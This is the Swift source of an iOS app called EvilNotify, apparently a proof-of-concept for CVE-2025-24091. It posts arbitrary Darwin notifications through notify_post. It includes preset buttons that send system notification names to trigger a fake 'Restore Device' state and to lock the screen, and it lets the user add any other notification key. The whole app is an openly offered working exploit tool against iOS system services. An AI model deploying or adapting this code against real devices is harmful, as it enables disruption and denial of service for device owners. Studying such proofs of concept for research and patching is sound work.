import SwiftUI
import notify

struct NotificationItem: Identifiable, Codable {
    var id = UUID()
    var key: String
    var label: String
}

struct Settings: Codable {
    var darkmode: Bool = false
    var confirmpost: Bool = true
}

struct ContentView: View {
    @Binding var settings: Settings
    
    @State private var notifkey: String = ""
    @State private var notiflabel: String = ""
    @State private var notifications: [NotificationItem] = []
    @State private var showsettings = false
    @State private var showconfirm = false
    @State private var notiftopost: String = ""

    private let storagekey = "com.roooot.evilnotify.savednotifs"
    private let settingskey = "com.roooot.evilnotify.settings"

    var body: some View {
        NavigationView {
            VStack {
                List {
                    Section {
                        TextField("key", text: $notifkey)
                        TextField("label", text: $notiflabel)
                        
                        Button {
                            add()
                        } label: {
                            Text("Add")
                                .foregroundColor(.blue)
                        }
                    } header: {
                        Text("Custom")
                    } footer: {
                        Text("key: eg. com.apple.something \nlabel: eg. Something")
                    }
                    
                    if !notifications.isEmpty {
                        Section {
                            ForEach(notifications) { item in
                                HStack {
                                    VStack(alignment: .leading) {
                                        Text(item.label).bold()
                                        Text(item.key).font(.caption).foregroundColor(.gray)
                                    }
                                    Spacer()
                                    Button {
                                        triggerpost(item.key)
                                    } label: {
                                        Text("Post")
                                            .foregroundColor(.blue)
                                    }
                                }
                            }
                            .onDelete(perform: delete)
                            .onMove(perform: move)
                        } header: {
                            Text("Custom Notifs")
                        }
                    }
                    
                    Section {
                        Button {
                            triggerpost("com.apple.MobileSync.BackupAgent.RestoreStarted")
                        } label: {
                            Text("Restore Device") .foregroundColor(.blue)
                        }
                        
                        Button {
                            triggerpost("com.apple.springboard.toggleLockScreen")
                        } label: {
                            Text("Lock Screen") .foregroundColor(.blue)
                        }
                    } header: {
                        Text("Premade Notifs")
                    }
                }
                .listStyle(InsetGroupedListStyle())
                .navigationTitle("EvilNotify")
                .toolbar {
                    ToolbarItem(placement: .navigationBarTrailing) {
                        Button {
                            showsettings = true
                        } label: {
                            Image(systemName: "gearshape")
                        }
                    }
                }
                .environment(\.colorScheme, settings.darkmode ? .dark : .light)
            }
            .onAppear {
                loadnotifs()
                loadsettings()
            }
            .alert(isPresented: $showconfirm) {
                Alert(
                    title: Text("Confirm Post"),
                    message: Text("Post notification \(notiftopost)?"),
                    primaryButton: .destructive(Text("Post")) { post(notiftopost) },
                    secondaryButton: .cancel()
                )
            }
            .sheet(isPresented: $showsettings) {
                SettingsView(settings: $settings, savesettings: savesettings)
            }
        }
    }

    func add() {
        guard !notifkey.isEmpty, !notiflabel.isEmpty else { return }
        let newitem = NotificationItem(key: notifkey, label: notiflabel)
        notifications.append(newitem)
        savenotifs()
        notifkey = ""
        notiflabel = ""
    }

    func delete(at offsets: IndexSet) {
        notifications.remove(atOffsets: offsets)
        savenotifs()
    }

    func move(from source: IndexSet, to destination: Int) {
        notifications.move(fromOffsets: source, toOffset: destination)
        savenotifs()
    }

    func triggerpost(_ key: String) {
        if settings.confirmpost {
            notiftopost = key
            showconfirm = true
        } else {
            post(key)
        }
    }

    func post(_ key: String) {
        print("[ + ] posting \(key)")
        notify_post(key)
        print("[ i ] posted \(key)\n")
    }

    func savenotifs() {
        if let encoded = try? JSONEncoder().encode(notifications) {
            UserDefaults.standard.set(encoded, forKey: storagekey)
        }
    }

    func loadnotifs() {
        if let saveddata = UserDefaults.standard.data(forKey: storagekey),
           let decoded = try? JSONDecoder().decode([NotificationItem].self, from: saveddata) {
            notifications = decoded
        }
    }

    func savesettings() {
        if let encoded = try? JSONEncoder().encode(settings) {
            UserDefaults.standard.set(encoded, forKey: settingskey)
        }
    }

    func loadsettings() {
        if let data = UserDefaults.standard.data(forKey: settingskey),
           let decoded = try? JSONDecoder().decode(Settings.self, from: data) {
            settings = decoded
        }
    }
}

struct SettingsView: View {
    @Binding var settings: Settings
    var savesettings: () -> Void

    var body: some View {
        NavigationView {
            List {
                Section {
                    Toggle("Dark Mode", isOn: $settings.darkmode)
                    Toggle("Confirm before posting", isOn: $settings.confirmpost)
                }
                
                Section {
                    HStack {
                        AsyncImage(url: URL(string: "https://github.com/rooootdev.png")) { image in
                            image
                                .resizable()
                                .scaledToFill()
                        } placeholder: {
                            ProgressView()
                        }
                        .frame(width: 40, height: 40)
                        .clipShape(Circle())

                        VStack(alignment: .leading) {
                            Text("roooot")
                                .font(.headline)
                            
                            Text("Main developer")
                                .font(.subheadline)
                                .foregroundColor(Color.secondary)
                        }
                        
                        Spacer()
                    }
                    .onTapGesture {
                        if let url = URL(string: "https://github.com/rooootdev"),
                           UIApplication.shared.canOpenURL(url) {
                            UIApplication.shared.open(url)
                        }
                    }
                    
                    HStack {
                        AsyncImage(url: URL(string: "https://github.com/insidegui.png")) { image in
                            image
                                .resizable()
                                .scaledToFill()
                        } placeholder: {
                            ProgressView()
                        }
                        .frame(width: 40, height: 40)
                        .clipShape(Circle())

                        VStack(alignment: .leading) {
                            Text("_inside")
                                .font(.headline)
                            
                            Text("CVE-2025-24091")
                                .font(.subheadline)
                                .foregroundColor(Color.secondary)
                        }
                        
                        Spacer()
                    }
                    .onTapGesture {
                        if let url = URL(string: "https://github.com/insidegui"),
                           UIApplication.shared.canOpenURL(url) {
                            UIApplication.shared.open(url)
                        }
                    }
                } header: {
                    Text("Credits")
                }
            }
            .navigationTitle("Settings")
            .toolbar {
                ToolbarItem(placement: .confirmationAction) {
                    Button("Done") {
                        savesettings()
                    }
                }
            }
        }
    }
}

@main
struct EvilNotify: App {
    @State private var settings = Settings()
    private let settingskey = "com.roooot.evilnotify.settings"

    var body: some Scene {
        WindowGroup {
            ContentView(settings: $settings)
                .preferredColorScheme(settings.darkmode ? .dark : .light)
                .onAppear {
                    loadsettings()
                }
        }
    }

    func loadsettings() {
        if let data = UserDefaults.standard.data(forKey: settingskey),
           let decoded = try? JSONDecoder().decode(Settings.self, from: data) {
            settings = decoded
        }
    }
}
